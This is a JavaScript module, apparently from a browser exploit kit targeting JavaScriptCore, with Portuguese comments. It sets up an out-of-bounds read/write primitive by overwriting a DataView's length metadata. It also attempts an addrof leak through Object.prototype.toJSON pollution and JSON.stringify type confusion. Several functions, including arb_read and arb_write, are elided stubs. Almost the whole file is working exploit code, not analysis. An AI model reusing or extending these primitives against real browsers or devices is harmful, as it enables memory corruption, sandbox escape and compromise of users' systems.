// js/core_exploit.mjs (v31.R14 - Depuração de isOOBReady e sonda addrof)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false; // Flag global do módulo indicando se o setup básico OOB foi feito

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; 

const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) { 
    if (!isOOBEnvironmentSetup && !options.force_clear_even_if_not_setup) return;
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
    log(`[CoreExploit.clearOOBEnvironment] Ambiente limpo. isOOBEnvironmentSetup: ${isOOBEnvironmentSetup}`, 'info');
}
export function getOOBAllocationSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.INITIAL_BUFFER_SIZE; }

export async function triggerOOB_primitive(options = { force_reinit: false }) { 
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    let currentLength = 0;
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
        try { currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true); } catch(e){ currentLength = 0; }
    }

    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real && currentLength === 0xFFFFFFFF) {
            log(`[${FNAME_TRIGGER}] Ambiente OOB já configurado e expandido. Pulando.`, 'info');
            return true;
        } else { 
            log(`[${FNAME_TRIGGER}] Ambiente OOB inconsistente (len:${currentLength}). Forçando re-init.`, 'warn'); 
            clearOOBEnvironment({ force_clear_even_if_not_setup: true }); 
        }
    }
    log(`[${FNAME_TRIGGER}] Iniciando Config (Force: ${options.force_reinit}, Anterior Setup: ${isOOBEnvironmentSetup})`, 'test');
    const currentAllocSize = getOOBAllocationSize(); clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // clear sets isOOBEnvironmentSetup = false
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize); 
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        isOOBEnvironmentSetup = true; // Setado ANTES da escrita, para que oob_write_absolute possa funcionar se chamado daqui
        log(`[${FNAME_TRIGGER}] ArrayBuffer e DataView criados. isOOBEnvironmentSetup: ${isOOBEnvironmentSetup}`, 'info');

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
            // Usa o oob_dataview_real para escrever em seu próprio buffer (oob_array_buffer_real)
            // para modificar os metadados da view que estão plantados lá.
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, 0xFFFFFFFF, true);
            log(`    m_length do oob_dataview_real (para arb R/W) expandido para 0xFFFFFFFF no offset ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}.`, 'info', FNAME_TRIGGER);
        } else { 
            const eMsg = `Falha ao expandir m_length (arb R/W): AllocSize (${currentAllocSize}) pequeno para offset ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}.`; 
            log(eMsg, 'critical', FNAME_TRIGGER); 
            isOOBEnvironmentSetup = false; // Falhou em configurar
            throw new Error(eMsg); 
        }
        const finalLen = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true);
        log(`[${FNAME_TRIGGER}] Ambiente OOB CONFIGURADO. oob_dv.len=${finalLen}. isOOBEnvironmentSetup: ${isOOBEnvironmentSetup}`, 'good');
        return true;
    } catch (e) { 
        log(`ERRO CRÍTICO ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER); 
        console.error(e); 
        clearOOBEnvironment({ force_clear_even_if_not_setup: true }); 
        throw e; 
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... (sem alterações) ... */ }
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... (sem alterações) ... */ }

export function isOOBReady() { 
    const FNAME_ISREADY = 'CoreExploit.isOOBReady';
    let mLE = false; 
    let setupFlag = isOOBEnvironmentSetup;
    let abOk = oob_array_buffer_real instanceof ArrayBuffer && oob_array_buffer_real.byteLength > 0;
    let dvOk = oob_dataview_real instanceof DataView;
    let dvBufferOk = dvOk && oob_dataview_real.buffer === oob_array_buffer_real;

    if (setupFlag && abOk && dvOk && dvBufferOk) { 
        try { 
            if (oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
                mLE = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true) === 0xFFFFFFFF); 
            }
        } catch (e) { 
            log(`[${FNAME_ISREADY}] Erro ao ler m_length: ${e.message}`, 'error');
            mLE = false; 
        } 
    }
    const overallReady = setupFlag && abOk && dvOk && dvBufferOk && mLE;
    log(`[${FNAME_ISREADY}] Status: Overall=${overallReady} (Setup=${setupFlag}, AB_OK=${abOk}, DV_OK=${dvOk}, DV_Buff_OK=${dvBufferOk}, mLengthExp=${mLE})`, overallReady ? 'info' : 'warn');
    return overallReady;
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... (sem alterações) ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... (sem alterações) ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... (sem alterações) ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... (sem alterações) ... */ }

const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; 
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... (sem alterações) ... */ }

let _targetObjectForCoreAddrof_R14 = null; 
let _core_heisenbug_confirmed_by_probe_R14 = false;
let _core_victim_float_view_for_addrof_R14 = null; 
let _core_m2_victim_object_for_probe_R14 = null; // Referência ao objeto m2 que a sonda deve identificar

function _toJSONProbeForCoreAddrof_R14() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R14";
    let currentThisType = Object.prototype.toString.call(this);
    let isIdentifiedAsM2 = (this === _core_m2_victim_object_for_probe_R14); // Comparação de referência direta

    log(`[${FNAME_PROBE}] 'this' type: ${currentThisType}. É ref de _core_m2_victim_object_for_probe_R14? ${isIdentifiedAsM2}.`, "leak");
    if (this && this.id_m2_probe) { // Log adicional para checar a propriedade ID
        log(`[${FNAME_PROBE}] 'this' tem id_m2_probe: ${this.id_m2_probe}`, "leak");
    }


    if (isIdentifiedAsM2 && currentThisType === '[object Object]') { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para _core_m2_victim_object_for_probe_R14! Escrevendo targetObject...`, "vuln");
        _core_heisenbug_confirmed_by_probe_R14 = true;
        if (_targetObjectForCoreAddrof_R14 && _core_victim_float_view_for_addrof_R14) {
            try {
                _core_victim_float_view_for_addrof_R14[0] = _targetObjectForCoreAddrof_R14;
                log(`[${FNAME_PROBE}] targetObject escrito em float_view[0].`, "info");
            } catch (e_write) { log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");}
        }
    } else if (isIdentifiedAsM2) {
        log(`[${FNAME_PROBE}] 'this' é _core_m2_victim_object_for_probe_R14, mas tipo é ${currentThisType}. TC falhou.`, "warn");
    }
    return { core_addrof_probe_r14_executed: true };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R14
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R14";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R14...`, "info");

    _targetObjectForCoreAddrof_R14 = targetObject; 
    _core_heisenbug_confirmed_by_probe_R14 = false; 
    _core_victim_float_view_for_addrof_R14 = null;
    _core_m2_victim_object_for_probe_R14 = null; // Reseta a referência

    let addrof_result = { success: false, message: "Addrof (Heisenbug R14) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R14 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R14 = false;

    try {
        log(`[${FNAME_FUNC}] Chamando triggerOOB_primitive...`, "info");
        await triggerOOB_primitive({ force_reinit: true }); 
        log(`[${FNAME_FUNC}] triggerOOB_primitive completado. Checando isOOBReady...`, "info");
        if (!isOOBReady()) { // Checa APÓS triggerOOB_primitive completar
            log(`[${FNAME_FUNC}] isOOBReady() retornou false APÓS triggerOOB_primitive.`, "error");
            throw new Error("Ambiente OOB não pôde ser inicializado corretamente para Addrof R14."); 
        }
        log(`[${FNAME_FUNC}] Ambiente OOB pronto. Continuando com a escrita crítica...`, "info");

        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        log(`[${FNAME_FUNC}] Escrita crítica em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC)} realizada.`, "warn");
        await PAUSE(150); 

        let core_victim_buffer = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R14 = new Float64Array(core_victim_buffer);
        _core_victim_float_view_for_addrof_R14.fill(0.987654321098); 
        
        // _core_m2_victim_object_for_probe_R14 é o objeto que a sonda _toJSONProbeForCoreAddrof_R14 tentará identificar
        _core_m2_victim_object_for_probe_R14 = { 
            // id_m2_probe: "core_addrof_m2_target_R14_unique_id", // Tentar sem ID primeiro, confiando na referência
            // writer_view_ref: _core_victim_float_view_for_addrof_R14 // A sonda não precisa mais disso diretamente
        };
        // A sonda verificará 'this === _core_m2_victim_object_for_probe_R14'

        let core_m1_victim = { 
            id_m1: "core_addrof_m1_container_R14", 
            payload_m2: _core_m2_victim_object_for_probe_R14 
        };
        log(`[${FNAME_FUNC}] Estrutura core_m1/m2_victim criada. Alvo do stringify: core_m1_victim.`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R14, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R14 = true;
        
        JSON.stringify(core_m1_victim); 
        log(`[${FNAME_FUNC}] JSON.stringify concluído. _core_heisenbug_confirmed_by_probe_R14: ${_core_heisenbug_confirmed_by_probe_R14}`, "info");
        
        if (_core_heisenbug_confirmed_by_probe_R14) {
            const val_double = _core_victim_float_view_for_addrof_R14[0]; 
            addrof_result.leaked_address_as_double = val_double;
            const temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
            const temp_u32_view = new Uint32Array(temp_buf);
            const leaked_addr64 = new AdvancedInt64(temp_u32_view[0], temp_u32_view[1]);
            addrof_result.leaked_address_as_int64 = leaked_addr64;
            log(`[${FNAME_FUNC}] Heisenbug TC INTERNA confirmada! Lido de float_view[0]: Double=${val_double}, Int64=${leaked_addr64.toString(true)}`, "vuln");

            if (val_double !== 0.987654321098 && (leaked_addr64.low() !== 0 || leaked_addr64.high() !==0) ) {
                const lhi = leaked_addr64.high(); const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                if (!nan_inf) { addrof_result.success = true; addrof_result.message = `Addrof R14 TC OK. Addr Pot: ${leaked_addr64.toString(true)}`; }
                else { addrof_result.message = `Addrof R14 TC OK, mas val ${leaked_addr64.toString(true)} é NaN/Inf.`;}
            } else { addrof_result.message = `Addrof R14 TC OK, mas val (${leaked_addr64.toString(true)}) é preenchimento/0.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada pela sonda R14."; }
    } catch (e) { addrof_result.message = `Erro crítico em Addrof R14: ${e.message || String(e)}`; } 
    finally {
        if (pollutedByCore_R14) { if (originalToJSON_R14) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON_R14); else delete Object.prototype.toJSON; }
        _targetObjectForCoreAddrof_R14 = null; _core_victim_float_view_for_addrof_R14 = null; _core_m2_victim_object_for_probe_R14 = null;
    }
    log(`[${FNAME_FUNC}] Retornando resultado: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

export async function getStableConfusedArrayBuffer() { /* ... (sem alterações da v31.R13) ... */ }
export async function get_powerful_dataview_on_oob_buffer() { /* ... (sem alterações da v31.R13) ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... (sem alterações da v31.R13) ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... (sem alterações da v31.R13) ... */ }
